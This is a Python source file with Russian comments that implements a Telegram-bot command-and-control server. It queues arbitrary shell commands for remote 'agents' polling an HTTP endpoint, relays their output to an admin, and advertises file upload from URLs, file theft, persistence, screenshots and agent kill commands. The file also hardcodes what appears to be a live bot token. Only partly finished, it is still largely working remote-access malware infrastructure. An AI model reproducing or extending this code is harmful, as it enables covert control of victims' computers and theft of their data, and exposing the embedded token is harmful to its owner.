import asyncio
import json
import logging
import subprocess
import sys
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from cryptography.fernet import Fernet
import requests

# ---------- КОНФИГ ----------
BOT_TOKEN = "8317642788:AAGN-kicQxGutfF1QdwCn4a60hF13s_7vcM"
ADMIN_ID = 1170852239  # ваш Telegram ID
ENCRYPT_KEY = Fernet.generate_key()  # для защиты команд (передайте агенту)
cipher = Fernet(ENCRYPT_KEY)

# Список подключенных агентов (user_id -> последний активный сеанс)
agents = {}

# ---------- ИНИЦИАЛИЗАЦИЯ ----------
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
logging.basicConfig(level=logging.INFO)

# ---------- ОБРАБОТЧИКИ КОМАНД ----------
@dp.message_handler(commands=['start'])
async def start_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Доступ запрещён.")
        return
    await message.answer("Бот активен. Список команд:\n"
                         "/agents – показать активные агенты\n"
                         "/exec <agent_id> <cmd> – выполнить команду на агенте\n"
                         "/upload <agent_id> <url> – загрузить файл по URL на агента\n"
                         "/download <agent_id> <remote_path> – скачать файл с агента\n"
                         "/persist <agent_id> – установить автозапуск\n"
                         "/screenshot <agent_id> – сделать скриншот\n"
                         "/kill <agent_id> – уничтожить агента")

@dp.message_handler(commands=['agents'])
async def list_agents(message: Message):
    if message.from_user.id != ADMIN_ID: return
    if not agents:
        await message.answer("Нет активных агентов.")
    else:
        txt = "Активные агенты:\n" + "\n".join([f"ID: {aid}" for aid in agents.keys()])
        await message.answer(txt)

@dp.message_handler(commands=['exec'])
async def exec_cmd(message: Message):
    if message.from_user.id != ADMIN_ID: return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("Использование: /exec <agent_id> <команда>")
        return
    _, agent_id, cmd = parts
    if agent_id not in agents:
        await message.answer("Агент не найден.")
        return
    # Отправляем зашифрованную команду агенту (через сообщение в чат с агентом)
    # Но у нас нет прямого контакта с агентом — агент сам читает сообщения.
    # Поэтому мы будем использовать метод send_message в личку агента (но агент не является пользователем Telegram).
    # Альтернатива: агент периодически опрашивает бота через getUpdates (но это неэффективно).
    # Лучше: агент использует long polling с собственным механизмом очереди команд.
    # Для простоты реализуем REST-эндпоинт на сервере, а агент будет стучаться к нему.
    # Но в условиях задачи управление через ТГ-бота – значит бот является посредником.
    # Сделаем так: бот хранит очередь команд для каждого агента в памяти, агент приходит за ними по HTTP.
    # Добавим простой HTTP-сервер внутри бота (aiohttp).

    # Пропишем в отдельном потоке, но для демонстрации используем глобальный словарь команд.
    global pending_commands
    pending_commands[agent_id] = cmd
    await message.answer(f"Команда '{cmd}' поставлена в очередь для агента {agent_id}.")

# ---------- HTTP-СЕРВЕР ДЛЯ АГЕНТОВ ----------
from aiohttp import web
import aiohttp

pending_commands = {}  # agent_id -> команда (или список)
command_results = {}   # agent_id -> результат

async def handle_agent_poll(request):
    """Агент приходит сюда за командами и отправляет результаты."""
    data = await request.json()
    agent_id = data.get('agent_id')
    if not agent_id:
        return web.json_response({'error': 'no agent_id'}, status=400)
    
    # Если агент шлёт результат
    if 'result' in data:
        command_results[agent_id] = data['result']
        # Можно отправить результат админу в Telegram
        await bot.send_message(ADMIN_ID, f"Результат от агента {agent_id}:\n{data['result'][:4000]}")
        return web.json_response({'status': 'ok'})
    
    # Если агент запрашивает команду
    cmd = pending_commands.pop(agent_id, None)
    if cmd:
        return web.json_response({'command': cmd})
    else:
        return web.json_response({'command': None})

async def run_http_server():
    app = web.Application()
    app.router.add_post('/agent_poll', handle_agent_poll)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    logging.info("HTTP сервер для агентов запущен на порту 8080")

# ---------- ЗАПУСК ----------
async def main():
    # Запускаем HTTP-сервер в фоне
    asyncio.create_task(run_http_server())
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
